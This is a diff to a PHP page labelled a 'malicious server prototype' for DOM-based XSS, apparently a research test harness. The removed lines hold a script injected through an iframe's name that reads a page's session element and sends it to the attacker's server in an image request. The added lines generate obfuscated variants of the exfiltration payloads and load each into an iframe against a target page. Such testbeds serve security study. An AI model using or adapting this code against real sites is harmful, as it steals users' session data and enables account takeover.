@@ -1,14 +1,131 @@
 <?php
 include('../declare.php');
+include(INCDIR.'payload.php');
+
+$errors = array();
+$attacks = array();
+
+function PrepareScript($testname, $obfu, $subs) {
+  if (is_array($subs)) {
+    // Keys from the argument will overwrite those from the base array.
+    $subs = array_merge(GetBaseSubs(), $subs);
+  } else if ($subs) {
+    // A truthy value indicates that the base array should be used.
+    $subs = GetBaseSubs();
+  }
+  if (is_string($obfu)) {
+    $code = GetObfuscatedPayload($testname, $obfu, $subs);
+  } else {
+    $code = GetPayload($testname, $subs);
+  }
+  $code = str_replace(array("'", "\n",  "\r"), array("\\'", '\\n', '\\r'), $code);
+  return 'dummy<script>'.$code.'</script>';
+}
+
+function PrepareImage($src) {
+  $src = str_replace('"', '\\"', $src);
+  return '<img src="'.$src.'" />';
+}
+
+$adesc = 'exfil_test';
+$attacks[$adesc] = array();
+foreach ($OBFUSCATIONS as $name => $obfu) {
+  $exfilsub = array('TESTNAME' => $name);
+  $attacks[$adesc][$name] = PrepareScript('exfil', $obfu, $exfilsub);
+}
+
+$adesc = 'exfil_clone1';
+$attacks[$adesc] = array();
+foreach ($OBFUSCATIONS as $name => $obfu) {
+  $testsuf = 'clone1_'.$name;
+  $exfilsub['TESTNAME'] = $testsuf;
+  $attacks[$adesc][$name] = PrepareScript('exfil_clone1', $obfu, $exfilsub);
+}
+
 
 $title = "Malicious server prototype: DOM-based XSS";
-include('../inc/header.php');
+include(INCDIR.'header.php');
 ?>
-<h1>DOM-based XSS</h1>
-<iframe id="embedder" name="dummy<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='<?=MALROOT?>images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>" width="400" height="400" src="<?=TGTROOT?>dombased/target"></iframe>
+<script type="text/javascript">
+<![CDATA[
+var payloads = {
 <?
+// Output a link for each obfuscation of each payload.
+foreach ($attacks as $aname => $attack) {
+  $jname = str_replace("'", "\\'", $aname);
+?>
+  '<?=$jname?>': {  
+<?
+  foreach ($attack as $ob => $pl) {
+    if (strpos($ob, '#') === 0) continue;
+    $job = str_replace("'", "\\'", $ob);
+    // $pl is already escaped for embedding in single-quotes.
+?>
+    '<?=$job?>': '<?=$pl?>',
+<?
+  }
+?>
+  }, // /<?=$ob?>
+
+<?
+}
+?>
+}; // /payloads
+
+function loadIframe(att, obfu) {
+  var frame = document.createElement('iframe');
+  frame.width = '400px';
+  frame.height = '400px';
+  frame.id = 'frame_' + obfu;
+
+  var plsub = payloads[att];
+  if (plsub === undefined) {
+    alert('Attack not found: ' + att);
+    return false;
+  }
+
+  frame.name = plsub[obfu];
+  frame.src="<?=TGTROOT?>dombased/target";
+  
+  var embed = document.getElementById('embed');
+  var last;
+  while (last = embed.lastChild) embed.removeChild(last);
+
+  embed.appendChild(frame);
+  return false;
+}
+]]>
+</script>
+<h1>DOM-based XSS</h1>
+<div id="embed">
+</div>
+<?
+// Output a link for each obfuscation of each payload.
+foreach ($attacks as $aname => $attack) {
+  $hname = htmlspecialchars($aname);
+  $escname = str_replace("'", "\\'", $aname);
+?>
+<h3 id="<?=$hname?>" ><?=$hname?></h3>
+<?
+  if (isset($attack['#comment'])) {
+?>
+<p class="comment"><?=htmlspecialchars($attack['#comment'])?></p>
+<?
+  }
+  $escatt = str_replace("'", '\\"', $aname);
+  foreach ($attack as $ob => $pl) {
+    if (strpos($ob, '#') === 0) continue;
+    $escob = str_replace("'", "\\'", $ob);
+    $onclick = "return loadIframe('".$escatt."', '".$escob."');";
+    $escoc = str_replace('"', '\\"', $onclick);
+?>
+| <a href="#" onclick="<?=$escoc?>"><?=htmlspecialchars($ob)?></a>
+<?
+  }
+}
+
 $links = array(
   'dom-based XSS start' => TGTROOT."dombased/start",
 );
-include('../inc/footer.php');
+include(INCDIR.'footer.php');
 ?>
